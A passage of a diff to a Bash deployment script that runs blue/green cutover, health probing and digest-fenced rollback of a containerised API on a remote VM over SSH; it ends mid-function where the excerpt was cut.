+    run_with_deadline "${timeout}" "cutover inflight probe ${env}" \
+      ssh -l "${OCI_USER}" -- "${OCI_HOST}" \
+      "sudo python3 -c 'import os, stat, sys
+try:
+    mode = os.lstat(sys.argv[1]).st_mode
+except FileNotFoundError:
+    print(\"ABSENT\")
+except OSError:
+    sys.exit(2)
+else:
+    if not stat.S_ISREG(mode):
+        sys.exit(2)
+    print(\"PRESENT\")' $(remote_quote "${inflight}")"
+  )" || rc=$?
+  if ((rc != 0)); then
+    # 1 is reserved for successful decoded ABSENT. Operational probe
+    # errors (SSH/auth/timeout/generic) must not collapse into that
+    # signal. TEST-15 / RES-02 / RLSE-03.
+    warn "cutover inflight probe failed for ${env} (rc=${rc})"
+    return 2
+  fi
+  case "${output}" in
+    PRESENT) return 0 ;;
+    ABSENT) return 1 ;;
+    *)
+      warn "cutover inflight probe returned malformed result for ${env}"
+      return 2
+      ;;
+  esac
+}
+
+commit_cutover_state() {
+  recognition_edge_assert_if_active || return 75
+  local env="$1" timeout inflight committed
+  env_to_unit "${env}" >/dev/null
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  inflight="${ACX_DEPLOY_BACKUP_ROOT}/${env}/cutover-inflight"
+  committed="${ACX_DEPLOY_BACKUP_ROOT}/${env}/cutover-committed"
+  recognition_edge_command "printf 'status=canonical\ntransaction=%s\n' $(remote_quote "${ACX_DEPLOY_TRANSACTION_ID}") | sudo tee $(remote_quote "${committed}") >/dev/null && sudo rm -f -- $(remote_quote "${inflight}")" ||
+    return 1
+  ACX_CUTOVER_COMMITTED=1
+  ACX_TRAFFIC_FLIPPED=0
+}
+
+recover_interrupted_cutover() {
+  local env="${ACX_CUTOVER_ENV:-}" inflight_rc=0 restore_status=0
+  [[ -n "${env}" ]] || return 0
+  if [[ "${ACX_CUTOVER_COMMITTED:-0}" == "1" && "${ACX_TRAFFIC_FLIPPED:-0}" != "1" ]]; then
+    return 0
+  fi
+  if [[ "${ACX_TRAFFIC_FLIPPED:-0}" != "1" ]]; then
+    # `||` keeps set -e from treating confirmed ABSENT (rc 1) as a hard fail.
+    cutover_inflight_present "${env}" || inflight_rc=$?
+    case "${inflight_rc}" in
+      0) ACX_TRAFFIC_FLIPPED=1 ;;
+      1) return 0 ;;
+      *) return "${inflight_rc}" ;;
+    esac
+  fi
+  if [[ "${ACX_LIVE_DISRUPTED:-0}" == "1" ]]; then
+    local unit
+    unit="$(env_to_unit "${env}")"
+    warn "INTERRUPTED while ${unit} restarts; traffic left on ${env}-next. Recovery: $(rollback_command_hint "${env}")"
+    return 1
+  fi
+  log "Interrupted cutover for ${env}; restoring canonical routing while keeping the candidate recoverable"
+  if restore_edge_backups "${env}"; then
+    # Keep durable inflight evidence until candidate cleanup succeeds. A fresh
+    # recovery can safely repeat canonical restoration and retry the drain.
+    if ! abort_cutover_candidate "${env}"; then
+      warn "candidate cleanup after interrupted cutover failed"
+      return 1
+    fi
+    if ! commit_cutover_state "${env}"; then
+      warn "canonical restore and drain succeeded but commit marker failed"
+      return 1
+    fi
+    return 0
+  else
+    restore_status=$?
+  fi
+  # Stale global generation is an ownership refusal even with a fresh lock.
+  # It cannot license candidate enablement as a fallback.
+  ((restore_status != 75)) || return 75
+  recognition_edge_assert_if_active || return 75
+  warn "edge restore after interrupt failed; leaving candidate ${env}-next enabled and serving"
+  enable_cutover_candidate "${env}" || warn "could not enable cutover candidate after failed edge restore"
+  return 1
+}
+
+recover_failed_flip_to_next() {
+  local env="$1" inflight_rc=0
+  cutover_inflight_present "${env}" || inflight_rc=$?
+  if ((inflight_rc == 1)); then
+    if ! abort_cutover_candidate "${env}"; then
+      warn "cutover candidate cleanup failed after failed traffic flip"
+      return 1
+    fi
+    return 0
+  fi
+  ACX_TRAFFIC_FLIPPED=1
+  recover_interrupted_cutover || return $?
+  return 0
+}
+
+# The environment lease means markers here belong only to a dead or expired transaction.
+recover_persisted_cutover() {
+  local env="$1" inflight_rc=0
+  env_to_unit "${env}" >/dev/null
+  ACX_CUTOVER_ENV="${env}"
+  # `||` keeps set -e from treating confirmed ABSENT (rc 1) as a hard fail.
+  cutover_inflight_present "${env}" || inflight_rc=$?
+  case "${inflight_rc}" in
+    0) ;;
+    1) return 0 ;;
+    *) return "${inflight_rc}" ;;
+  esac
+  ACX_TRAFFIC_FLIPPED=1
+  log "Found persisted inflight cutover for ${env}; recovering before a new candidate"
+  recover_interrupted_cutover
+}
+
+restore_runtime_topology() {
+  recognition_edge_assert_if_active || return 75
+  local env="$1" restore_mode="${2:-}"
+  if [[ "${restore_mode}" == "current-only" ]]; then
+    restore_topology_backups "$env" current-only || return $?
+    restore_edge_backups "$env" current-only || return $?
+    return 0
+  else
+    restore_topology_backups "$env" || return $?
+    restore_edge_backups "$env" || return $?
+  fi
+  abort_cutover_candidate "$env" || return $?
+}
+
+flip_edge_alias() {
+  local env="$1" target="$2" digest="${3:-${ACX_CANDIDATE_DIGEST_REF:-}}"
+  env_to_api_alias "$env" >/dev/null || return 1
+  [[ "$target" == next || "$target" == canonical ]] || return 2
+  recognition_edge_begin "$env" || return $?
+  recognition_edge_remote flip "$env" "$target" "$digest"
+}
+
+health_probe_program() {
+  cat <<'PYPROBE'
+import json
+import socket
+import sys
+import urllib.error
+import urllib.request
+
+def probe():
+    try:
+        with urllib.request.urlopen("http://127.0.0.1:8000/health", timeout=4) as r:
+            if r.status != 200:
+                print("HTTP " + str(r.status))
+                return 1
+            if len(sys.argv) > 1:
+                body = json.load(r)
+                actual = body.get("commit_sha") or body.get("git_commit_sha") or body.get("version") or ""
+                if not actual == sys.argv[1]:
+                    print(" ".join(("SHA mismatch: expected " + sys.argv[1] + ", actual " + str(actual)).split()))
+                    return 1
+            return 0
+    except urllib.error.HTTPError as exc:
+        cause = "HTTP " + str(exc.code)
+    except (TimeoutError, socket.timeout):
+        cause = "timeout"
+    except urllib.error.URLError as exc:
+        if isinstance(exc.reason, (TimeoutError, socket.timeout)):
+            cause = "timeout"
+        elif isinstance(exc.reason, ConnectionRefusedError):
+            cause = "connection refused"
+        else:
+            cause = "connection failed: " + str(exc.reason)
+    except Exception as exc:
+        cause = type(exc).__name__ + ": " + str(exc)
+    print(" ".join(cause.split()))
+    return 1
+
+sys.exit(probe())
+PYPROBE
+}
+
+probe_cutover_api_health() {
+  local env="$1" expected_digest expected_sha next_project remote_dir timeout attempt max_attempts sleep_s budget
+  local image_only=0 sha_argument=""
+  local expected_image_id cause rc program
+  program="$(health_probe_program)"
+  expected_digest="${2:-${ACX_CANDIDATE_DIGEST_REF:-}}"
+  expected_sha="${3:-}"
+  if [[ "${expected_sha}" == "--image-only" ]]; then
+    image_only=1
+    expected_sha=""
+  else
+    pin_deploy_sha
+  fi
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  next_project="acx-${env}-next"
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  if [[ ! "${expected_digest}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
+    warn "cutover candidate health probe requires a digest-pinned expected image"
+    return 1
+  fi
+  if [[ "${image_only}" != "1" ]]; then
+    if [[ -z "${expected_sha}" ]]; then
+      expected_sha="${DEPLOY_SHA}"
+    fi
+    if [[ ! "${expected_sha}" =~ ^[a-f0-9]{40}$ ]]; then
+      warn "cutover candidate health probe requires a valid expected commit"
+      return 1
+    fi
+    sha_argument=" '${expected_sha}'"
+  fi
+  if ! budget="$(probe_budget ACX_CUTOVER_HEALTH 5 5)"; then
+    return 1
+  fi
+  read -r max_attempts sleep_s <<<"${budget}"
+  log "Cutover candidate health budget: ${max_attempts}x${sleep_s}s (ACX_CUTOVER_HEALTH_*)"
+  expected_image_id="$(remote_image_id_for_digest "${expected_digest}" || true)"
+  if [[ ! "${expected_image_id}" =~ ^sha256:[a-f0-9]{64}$ ]]; then
+    warn "cutover candidate image identity could not be resolved for ${expected_digest}"
+    return 1
+  fi
+  for attempt in $(seq 1 "${max_attempts}"); do
+    if cause="$(run_with_deadline "${timeout}" "cutover health probe ${env} attempt ${attempt}" \
+      ssh -l "${OCI_USER}" -- "${OCI_HOST}" \
+      "cd '${remote_dir}' && cid=\$(docker compose -p '${next_project}' -f docker-compose.cutover.yml ps -q api | head -1) && { [ -n \"\$cid\" ] || { echo container missing; exit 1; }; } && image_id=\$(docker inspect --format '{{.Image}}' \"\$cid\") && { [ \"\$image_id\" = '${expected_image_id}' ] || { echo image mismatch; exit 1; }; } && docker exec \"\$cid\" python -c '${program}'${sha_argument}" 2>&1)"; then
+      log "Cutover candidate ${next_project} is healthy"
+      return 0
+    else
+      rc=$?
+    fi
+    if [[ "$rc" == 124 ]]; then cause="deadline exceeded"; fi
+    cause="${cause//$'\n'/ }"
+    cause="${cause//$'\r'/ }"
+    warn "Cutover candidate health failed on attempt ${attempt}/${max_attempts}: ${cause:-remote probe failed (exit $rc)}"
+    verify_retry_sleep "${attempt}" "${max_attempts}" "${sleep_s}"
+  done
+  return 1
+}
+
+probe_canonical_api_health() {
+  local env="$1" remote_dir compose_files timeout attempt max_attempts sleep_s cause rc program budget
+  program="$(health_probe_program)"
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  compose_files="$(env_to_compose_files "$env")" || return 1
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  if ! budget="$(probe_budget ACX_CANONICAL_HEALTH 8 5)"; then
+    return 1
+  fi
+  read -r max_attempts sleep_s <<<"${budget}"
+  log "Canonical api health budget: ${max_attempts}x${sleep_s}s (ACX_CANONICAL_HEALTH_*)"
+  for attempt in $(seq 1 "${max_attempts}"); do
+    # shellcheck disable=SC2086 # compose_files is intentionally word-split remotely.
+    if cause="$(run_with_deadline "${timeout}" "canonical health probe ${env} attempt ${attempt}" \
+      ssh -l "${OCI_USER}" -- "${OCI_HOST}" \
+      "cd '${remote_dir}' && cid=\$(docker compose ${compose_files} ps -q api | head -1) && { [ -n \"\$cid\" ] || { echo container missing; exit 1; }; } && docker exec \"\$cid\" python -c '${program}'" 2>&1)"; then
+      log "Canonical api ${env} is healthy"
+      return 0
+    else
+      rc=$?
+    fi
+    if [[ "$rc" == 124 ]]; then cause="deadline exceeded"; fi
+    cause="${cause//$'\n'/ }"
+    cause="${cause//$'\r'/ }"
+    warn "Canonical api health failed on attempt ${attempt}/${max_attempts}: ${cause:-remote probe failed (exit $rc)}"
+    verify_retry_sleep "${attempt}" "${max_attempts}" "${sleep_s}"
+  done
+  return 1
+}
+
+ship_cutover_candidate_units() {
+  recognition_edge_assert_if_active || return 75
+  local env="$1" remote_dir next_unit content
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  next_unit="$(env_to_next_unit "$env")" || return 1
+  log "Shipping cutover candidate unit ${next_unit} on ${SSH_TARGET}"
+  content="$(render_cutover_compose)" || return $?
+  recognition_edge_install "$remote_dir/docker-compose.cutover.yml" "$content"$'\n' || return $?
+  content="$(render_next_unit "$env")" || return $?
+  recognition_edge_install "/etc/systemd/system/$next_unit.service" "$content"$'\n'
+}
+
+do_restart() {
+  recognition_edge_assert_if_active || return 75
+  local env="$1" expected_digest="${2:-${ACX_CANDIDATE_DIGEST_REF:-}}"
+  local unit next_unit expected_repo env_tag pulled_digest expected_sha timeout remote_dir
+  ACX_RESTART_EVIDENCE_PHASE="pre_candidate"
+  ACX_TRAFFIC_FLIPPED=0
+  ACX_CUTOVER_ENV="$env"
+  ACX_CUTOVER_COMMITTED=0
+  ACX_LIVE_DISRUPTED=0
+  unit="$(env_to_unit "$env")" || return 1
+  next_unit="$(env_to_next_unit "$env")" || return 1
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  pin_deploy_sha
+  expected_sha="${DEPLOY_SHA}"
+  expected_repo="${expected_digest%@sha256:*}"
+  env_tag="$(env_to_tag "${env}")" || return 1
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  assert_remote_env_image_tag "$env"
+  if [[ ! "${expected_digest}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ||
+    "${expected_repo}" != "${ACX_IMAGE_REPO}" ]]; then
+    warn "restart requires the smoke-fenced digest for ACX_IMAGE_REPO=${ACX_IMAGE_REPO} (got: ${expected_digest:-empty})"
+    return 1
+  fi
+  if ! recover_persisted_cutover "$env"; then
+    warn "persisted inflight cutover for ${env} could not be recovered; refusing a new candidate"
+    return 1
+  fi
+  ACX_CANDIDATE_DIGEST_REF="${expected_digest}"
+  # ACX_IMAGE_REPO is shipped once in promote_gate (S2-A-06), including the
+  # ACX_CONVERGE_RUNTIME=0 image-only path — do not rewrite .env again here.
+  # A-11: pull materialises layers on the VM — free-space floor for VLM.
+  assert_remote_disk_headroom_for_pull
+  # Pull first so the repair service image matches the about-to-restart stack.
+  # This also covers ACX_BOOT_SMOKE=0, where the earlier remote pull/login was
+  # deliberately skipped.
+  preflight_remote_ocir_auth
+  log "Pulling smoke-fenced ${expected_digest} on ${SSH_TARGET}"
+  if ! _pull_ref_remote "${expected_digest}"; then
+    warn "digest-pinned api pull failed on ${env}"
+    return 1
+  fi
+  pulled_digest="$(remote_image_digest_ref "${expected_digest}" || true)"
+  if [[ "${pulled_digest}" != "${expected_digest}" ]]; then
+    warn "DIGEST MISMATCH: restart expected ${expected_digest}, target resolved ${pulled_digest:-empty}"
+    return 1
+  fi
+  # Compose names the mutable environment tag. Point the VM-local tag at the
+  # exact bytes that passed smoke; never re-pull that mutable tag across the gate.
+  if ! remote_docker_with_config tag "${expected_digest}" "${expected_repo}:${env_tag}"; then
+    warn "could not stage ${expected_digest} as the VM-local ${expected_repo}:${env_tag}"
+    return 1
+  fi
+  if ! repair_blob_volume_ownership "$env"; then
+    return 1
+  fi
+
+  # Deploy and rollback share the same rendered candidate units.
+  if ! ship_cutover_candidate_units "$env"; then
+    return 1
+  fi
+
+  log "Starting cutover candidate ${next_unit} (live unit ${unit} stays serving)"
+  ACX_RESTART_EVIDENCE_PHASE="post_restart"
+  if ! recreate_cutover_candidate "$env"; then
+    warn "cutover candidate ${next_unit} could not be force-recreated"
+    if ! abort_cutover_candidate "$env"; then
+      warn "cutover candidate cleanup also failed after recreation failure"
+    fi
+    return 1
+  fi
+  if ! probe_cutover_api_health "$env" "${expected_digest}" "${expected_sha}"; then
+    warn "cutover candidate never became healthy; live unit ${unit} left serving"
+    if ! abort_cutover_candidate "$env"; then
+      warn "cutover candidate cleanup failed after health failure"
+    fi
+    return 1
+  fi
+  if ! flip_edge_alias "$env" next; then
+    warn "traffic flip to ${next_unit} failed; live unit ${unit} left serving"
+    if ! recover_failed_flip_to_next "$env"; then
+      warn "edge state after failed flip is unresolved for ${env}; candidate ${next_unit} left running. Recovery: $(rollback_command_hint "${env}")"
+    fi
+    return 1
+  fi
+  ACX_TRAFFIC_FLIPPED=1
+  if ! enable_cutover_candidate "$env"; then
+    warn "could not enable ${next_unit} after traffic flip; reverting to keep reboot-safe routing"
+    if flip_edge_alias "$env" canonical; then
+      ACX_TRAFFIC_FLIPPED=0
+      ACX_CUTOVER_COMMITTED=1
+      if ! abort_cutover_candidate "$env"; then
+        warn "cutover candidate cleanup failed after enablement rollback"
+      fi
+    else
+      warn "canonical flip failed; leaving candidate ${next_unit} serving"
+    fi
+    return 1
+  fi
+  if ! curl --fail --silent --show-error --max-time 10 "$(env_to_health_url "$env")" >/dev/null; then
+    warn "public health failed after traffic flip; reverting to ${unit}"
+    if flip_edge_alias "$env" canonical; then
+      ACX_TRAFFIC_FLIPPED=0
+      ACX_CUTOVER_COMMITTED=1
+      if ! abort_cutover_candidate "$env"; then
+        warn "cutover candidate cleanup failed after public health rollback"
+      fi
+    else
+      warn "canonical flip failed; leaving candidate ${next_unit} serving"
+    fi
+    return 1
+  fi
+
+  log "Restarting ${unit} onto the candidate image (traffic on ${next_unit})"
+  recognition_edge_assert_if_active || return 75
+  ACX_LIVE_DISRUPTED=1
+  if ! recognition_edge_command "sudo systemctl restart ${unit}"; then
+    warn "systemctl restart ${unit} failed; traffic remains on ${next_unit}"
+    return 1
+  fi
+  # The canonical unit's ExecStop is deliberately scoped to api+worker so the
+  # shared postgres service remains available to the candidate. Re-gate the
+  # candidate after the canonical stack changes before moving traffic back.
+  if ! probe_cutover_api_health "$env" "${expected_digest}" "${expected_sha}"; then
+    warn "cutover candidate lost health after canonical api/worker restart; traffic remains on ${next_unit}"
+    return 1
+  fi
+  if ! probe_canonical_api_health "$env"; then
+    warn "canonical api never became healthy after restart; traffic remains on ${next_unit}"
+    return 1
+  fi
+  if ! verify_running_image_digest "$env" "${expected_digest}"; then
+    warn "live unit ${unit} came up on the wrong image; traffic remains on ${next_unit}"
+    return 1
+  fi
+  if ! flip_edge_alias "$env" canonical; then
+    warn "could not flip traffic back to ${unit}; traffic remains on ${next_unit}"
+    return 1
+  fi
+  ACX_TRAFFIC_FLIPPED=0
+  ACX_CUTOVER_COMMITTED=1
+  if ! abort_cutover_candidate "$env"; then
+    warn "cutover candidate cleanup failed after successful canonical flip"
+    return 1
+  fi
+  ACX_LIVE_DISRUPTED=0
+  if ! write_deployed_release_receipt "$env" "${DEPLOY_SHA}" "${expected_digest}"; then
+    warn "RELEASE RECEIPT WRITE FAILED for ${env}; standalone verify will fail closed until the next successful deploy"
+  fi
+  return 0
+}
+
+# Automatic cutover compensation restarts the live unit only when this
+# transaction already disrupted it or flipped public traffic onto the candidate.
+# post_restart is an evidence-capture phase, not a live-restart trigger.
+cutover_failure_restart_runtime() {
+  if [[ "${ACX_LIVE_DISRUPTED:-0}" == "1" || "${ACX_TRAFFIC_FLIPPED:-0}" == "1" ]]; then
+    printf '1'
+  else
+    printf '0'
+  fi
+}
+
+assert_rollback_fence() {
+  local env="$1" restart_runtime="${2:-0}" env_tag timeout rollback_base pulled_digest
+  local current_digest candidate_digest candidate_base
+  local rollback_image_id candidate_image_id runtime_evidence runtime_kind
+  local runtime_cid runtime_image_id runtime_state runtime_project runtime_service runtime_hash
+  local prior_runtime_kind prior_runtime_cid prior_runtime_image_id prior_runtime_state
+  local prior_runtime_project prior_runtime_service prior_runtime_hash prior_runtime_extra
+  local runtime_owner="" known_runtime=0 canonical_project next_project
+  if [[ ! "${ACX_ROLLBACK_DIGEST_REF:-}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
+    warn "ROLLBACK REQUIRED but no previous serving digest was captured"
+    return 1
+  fi
+  rollback_base="${ACX_ROLLBACK_IMAGE_BASE:-${ACX_ROLLBACK_DIGEST_REF%@sha256:*}}"
+  if [[ "${ACX_ROLLBACK_DIGEST_REF}" != "${rollback_base}@sha256:"* ]]; then
+    warn "ROLLBACK REQUIRED but the captured repository and digest disagree"
+    return 1
+  fi
+  candidate_digest="${ACX_CANDIDATE_DIGEST_REF:-}"
+  if [[ ! "${candidate_digest}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
+    if [[ "${restart_runtime}" == "1" ]]; then
+      warn "ROLLBACK REQUIRED but no candidate generation was captured; refusing unfenced runtime rollback"
+      return 1
+    fi
+    candidate_digest=""
+    candidate_base=""
+  else
+    candidate_base="${candidate_digest%@sha256:*}"
+  fi
+  assert_safe_image_repo "rollback image repository" "${rollback_base}"
+  env_tag="$(env_to_tag "${env}")" || return 1
+  timeout="${ACX_PUSH_TIMEOUT:-900}"
+  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
+    warn "ACX_PUSH_TIMEOUT must be a positive integer (got: ${timeout})"
+    return 1
+  fi
+  if ! _pull_ref_remote "${ACX_ROLLBACK_DIGEST_REF}" >/dev/null; then
+    warn "rollback digest pull failed for ${ACX_ROLLBACK_DIGEST_REF}"
+    return 1
+  fi
+  pulled_digest="$(remote_image_digest_ref "${ACX_ROLLBACK_DIGEST_REF}" || true)"
+  if [[ "${pulled_digest}" != "${ACX_ROLLBACK_DIGEST_REF}" ]]; then
+    warn "ROLLBACK DIGEST MISMATCH: expected ${ACX_ROLLBACK_DIGEST_REF}, got ${pulled_digest:-empty}"
+    return 1
+  fi
+
+  # Fence automatic compensation against a newer deployment. The mutable tag
+  # may only be changed when its registry mapping is still this transaction's
+  # candidate (or is already the rollback digest after an idempotent retry).
+  if [[ -n "${candidate_digest}" ]]; then
+    if ! _pull_ref_remote "${rollback_base}:${env_tag}" >/dev/null ||
+      ! current_digest="$(remote_image_digest_ref "${rollback_base}:${env_tag}")"; then
+      warn "cannot observe current registry mapping for ${rollback_base}:${env_tag}; refusing unfenced rollback"
+      return 1
+    fi
+    if [[ ! "${current_digest}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
+      warn "current registry mapping is malformed; refusing rollback"
+      return 1
+    fi
+    if [[ "${current_digest}" != "${ACX_ROLLBACK_DIGEST_REF}" ]]; then
+      if [[ "${candidate_base}" != "${rollback_base}" || "${current_digest}" != "${candidate_digest}" ]]; then
+        warn "STALE ROLLBACK REFUSED: ${rollback_base}:${env_tag} now maps to ${current_digest}, not this transaction's ${candidate_digest}"
+        return 75
+      fi
+    fi
+  fi
+  if [[ "${restart_runtime}" != "1" ]]; then
+    return 0
+  fi
+  canonical_project="acx-${env}"
+  next_project="acx-${env}-next"
+  if ! rollback_image_id="$(remote_image_id_for_digest "${ACX_ROLLBACK_DIGEST_REF}")" ||
+    ! candidate_image_id="$(remote_image_id_for_digest "${candidate_digest}")"; then
+    warn "cannot resolve immutable candidate/rollback image IDs; refusing unfenced rollback"
+    return 1
+  fi
+  if ! runtime_evidence="$(read_api_runtime_evidence "${env}")"; then
+    warn "ROLLBACK REQUIRED but api runtime inspection is unknown; refusing unfenced rollback"
+    return 1
+  fi
+  if [[ "${runtime_evidence}" == "ABSENT" ]]; then
+    warn "ROLLBACK REQUIRED but no stopped api container proves this transaction's candidate generation"
+    return 1
+  fi
+  if [[ -n "${ACX_PRIOR_RUNTIME_IDENTITY:-}" ]]; then
+    IFS='|' read -r prior_runtime_kind prior_runtime_cid prior_runtime_image_id prior_runtime_state \
+      prior_runtime_project prior_runtime_service prior_runtime_hash prior_runtime_extra \
+      <<<"${ACX_PRIOR_RUNTIME_IDENTITY}"
+  fi
+  while IFS='|' read -r runtime_kind runtime_cid runtime_image_id runtime_state \
+    runtime_project runtime_service runtime_hash; do
+    # Compose scoping plus these labels make the stopped record an identity
+    # proof, rather than merely an unrelated container with the same image.
+    case "${runtime_kind}:${runtime_state}" in
+      RUNNING:running | RUNNING:restarting | STOPPED:created | STOPPED:exited | STOPPED:dead) ;;
+      *) continue ;;
+    esac
+    if [[ "${runtime_service}" != "api" || -z "${runtime_hash}" ]]; then
+      continue
+    fi
+    if [[ "${runtime_project}" != "${canonical_project}" &&
+      "${runtime_project}" != "${next_project}" ]]; then
+      continue
+    fi
+    if [[ "${runtime_image_id}" =~ ^sha256:[a-f0-9]{64}$ ]]; then
+      known_runtime=1
+    fi
+    case "${runtime_kind}" in
+      RUNNING)
+        if [[ "${runtime_image_id}" == "${candidate_image_id}" ]]; then
+          runtime_owner="running"
+        elif [[ "${runtime_image_id}" == "${rollback_image_id}" &&
+          "${runtime_project}" == "${canonical_project}" ]]; then
+          runtime_owner="running"
+        fi
+        ;;
+      STOPPED)
+        # A stopped candidate container is the positive evidence that the
+        # failed restart reached this transaction's generation. A stopped
+        # rollback container is accepted only after the registry is already
+        # on the rollback digest, making an idempotent retry safe.
+        if [[ "${runtime_image_id}" == "${candidate_image_id}" ]]; then
+          runtime_owner="stopped-candidate"
+        elif [[ "${runtime_image_id}" == "${rollback_image_id}" &&
+          "${runtime_project}" == "${canonical_project}" &&
+          "${current_digest}" == "${ACX_ROLLBACK_DIGEST_REF}" ]]; then
+          runtime_owner="stopped-rollback"
+        elif [[ "${runtime_project}" == "${canonical_project}" ]] &&
+          [[ "${prior_runtime_kind}" == "RUNNING" || "${prior_runtime_kind}" == "STOPPED" ]] &&
+          [[ "${prior_runtime_kind}:${prior_runtime_state}" =~ ^(RUNNING:(running|restarting)|STOPPED:(created|exited|dead))$ ]] &&
+          [[ -z "${prior_runtime_extra}" ]] &&
+          [[ "${runtime_cid}" == "${prior_runtime_cid}" &&
+            "${runtime_image_id}" == "${prior_runtime_image_id}" &&
+            "${runtime_project}" == "${prior_runtime_project}" &&
+            "${runtime_service}" == "${prior_runtime_service}" &&
+            "${runtime_hash}" == "${prior_runtime_hash}" ]] &&
+          [[ "${prior_runtime_image_id}" == "${candidate_image_id}" ||
+            "${prior_runtime_image_id}" == "${rollback_image_id}" ]]; then
+          runtime_owner="stopped-prior"
+        fi
+        ;;
+    esac
+    [[ -n "${runtime_owner}" ]] && break
+  done <<<"${runtime_evidence}"
+  if [[ -z "${runtime_owner}" ]]; then
+    if ((known_runtime == 1)); then
+      warn "STALE ROLLBACK REFUSED: ${env} runtime generation is outside this transaction's candidate/rollback fence"
+      return 75
+    fi
+    warn "runtime generation is unknown; refusing rollback"
+    return 1
+  fi
+  if [[ "${runtime_owner}" == "running" ]]; then
+    log "Confirmed running api container ${runtime_cid:0:12} in ${runtime_project} belongs to this transaction; proceeding with rollback"
+  elif [[ "${runtime_owner}" == "stopped-candidate" ]]; then
+    log "Confirmed stopped api container ${runtime_cid:0:12} belongs to the candidate generation; proceeding with rollback"
+  elif [[ "${runtime_owner}" == "stopped-prior" ]]; then
+    log "Confirmed stopped prior api container ${runtime_cid:0:12} belongs to the captured previous generation; proceeding with rollback"
+  fi
+}
+
+# Rollback interface: 0 = restored, 1 = ordinary failure, 75 = CAS refusal.
+# Status 75 requires a fresh generation observation, never a blind retry.
+rollback_failure() {
+  local status="$1"
+  shift
+  if [[ "${status}" == "75" ]]; then
+    warn "$*"
+    exit 75
+  fi
+  fail "$*"
+}
+
+restore_registry_env_tag() {
+  recognition_edge_assert_if_active || return 75
+  local env="$1" env_tag timeout inspect_timeout rollback_base current_digest
+  if [[ ! "${ACX_ROLLBACK_DIGEST_REF:-}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
+    warn "ROLLBACK REQUIRED but no previous serving digest was captured"
+    return 1
+  fi
+  rollback_base="${ACX_ROLLBACK_IMAGE_BASE:-${ACX_ROLLBACK_DIGEST_REF%@sha256:*}}"
+  env_tag="$(env_to_tag "${env}")" || return 1
+  timeout="${ACX_PUSH_TIMEOUT:-900}"
+  inspect_timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
+  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
+    warn "ACX_PUSH_TIMEOUT must be a positive integer (got: ${timeout})"
+    return 1
+  fi
+  if [[ -n "${ACX_CANDIDATE_DIGEST_REF:-}" ]]; then
+    # Recheck the generation immediately before retag/push. This is not an
+    # atomic registry CAS: the detached shared-tag lock can expire while this
+    # client is paused. Registry linearizability needs a separate coordinator
+    # gate; the target-local sticky resource lock does not close that gap.
+    if ! _pull_ref_remote "${rollback_base}:${env_tag}" >/dev/null ||
+      ! current_digest="$(remote_image_digest_ref "${rollback_base}:${env_tag}")"; then
+      warn "cannot observe current registry mapping for ${env} (${rollback_base}:${env_tag}) immediately before rollback push; refusing unfenced rollback"
+      return 1
+    fi
+    if [[ ! "${current_digest}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
+      warn "current registry mapping is malformed; refusing rollback"
+      return 1
+    fi
+    if [[ "${current_digest}" != "${ACX_ROLLBACK_DIGEST_REF}" &&
+      "${current_digest}" != "${ACX_CANDIDATE_DIGEST_REF}" ]]; then
+      warn "ROLLBACK CAS REFUSED: env ${env} observed ${current_digest} does not match planned ${ACX_CANDIDATE_DIGEST_REF}"
+      return 75
+    fi
+  fi
+  if ! run_with_deadline "${inspect_timeout}" "rollback VM-local retag for ${env}" \
+    remote_docker_with_config tag "${ACX_ROLLBACK_DIGEST_REF}" "${rollback_base}:${env_tag}"; then
+    warn "could not restore VM-local ${rollback_base}:${env_tag}"
+    return 1
+  fi
+  if ! run_with_deadline "${timeout}" "rollback push of ${rollback_base}:${env_tag}" \
+    remote_docker_with_config push "${rollback_base}:${env_tag}"; then
+    warn "could not restore registry tag ${rollback_base}:${env_tag}"
+    return 1
+  fi
+}
+
+staged_rollback_runtime() {
+  recognition_edge_assert_if_active || return 75
+  local env="$1" unit next_unit timeout
+  unit="$(env_to_unit "$env")" || return 1
+  next_unit="$(env_to_next_unit "$env")" || return 1
+  if [[ ! "${ACX_ROLLBACK_DIGEST_REF:-}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
+    warn "staged rollback requires a digest-pinned rollback image (got: ${ACX_ROLLBACK_DIGEST_REF:-empty})"
+    return 1
+  fi
+  if ! ship_cutover_candidate_units "$env"; then
+    return 1
+  fi
+  ACX_CUTOVER_ENV="$env"
+  ACX_CUTOVER_COMMITTED=0
+  if ! recreate_cutover_candidate "$env"; then
+    warn "rollback candidate ${next_unit} could not be force-recreated"
+    if ! abort_cutover_candidate "$env"; then
+      warn "rollback candidate cleanup also failed after recreation failure"
+    fi
+    return 1
+  fi
+  if ! probe_cutover_api_health "$env" "${ACX_ROLLBACK_DIGEST_REF}" --image-only; then
+    if ! abort_cutover_candidate "$env"; then
+      warn "rollback candidate cleanup failed after health failure"
+    fi
+    warn "rollback candidate never became healthy; ${unit} left serving the current release"
+    return 1
+  fi
+  if ! flip_edge_alias "$env" next "${ACX_ROLLBACK_DIGEST_REF}"; then
+    warn "traffic flip to ${next_unit} failed; ${unit} left serving the current release"
+    if ! recover_failed_flip_to_next "$env"; then
